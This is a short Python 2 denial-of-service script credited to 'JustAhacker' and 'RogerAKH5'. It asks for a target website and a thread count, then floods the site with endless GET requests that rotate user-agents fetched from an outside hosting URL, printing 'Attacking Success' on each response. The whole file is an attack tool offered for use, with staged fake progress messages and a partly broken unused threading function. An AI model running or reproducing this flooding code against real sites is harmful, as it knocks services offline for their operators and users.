#RECODED BY RogerAKH5
#CODED BY Just A hacker
import time
print ("DOS SCRIPT BY JustAhacker")
time.sleep(3)
print ("please Wait.....")
time.sleep(2)
print ("checking for a server....")
time.sleep(2)
print ("connecting.....")
time.sleep(2)
import requests,random,sys,time
from thread import *
heder = requests.get("https://justaserverscript.000webhostapp.com/user-agents.txt").text
heder = heder.split("\n")

ip = raw_input("Website Name : ")
if "http" not in ip:
   ip = "https://{}".format(ip)
try:
   requests.get(ip)
except:
   print ("Website not found or Connection Failed,aborting")
   sys.exit()

thr = int(raw_input("Speed (normal : 10) : "))
def atk(proto):
    while True:
      time.sleep(0.2)
      rand = random.choice(heder)
      try:
	a = requests.get(proto,headers = {'User-Agent': rand})
	if (str(a)) == "<Response [200]>":
	   print (str(time.localtime()[3]) + ":" + str(time.localtime()[4]) + ":" + str(time.localtime()[5]) + " Attacking Success")
      except requests.exceptions.ConnectionError:
	print ("Koneksi putus atau server telah down")



def kita():
    tred = threading.Thread(target=atk)
    tred.daemon = True
    tred.start()
    time.sleep(2)
    for i in range(thr):
      tred.join()
def lol():
  for i in range(thr):
    start_new_thread(atk,(ip,))
    print ("DOS THREAD +1")
    time.sleep(1)

lol()
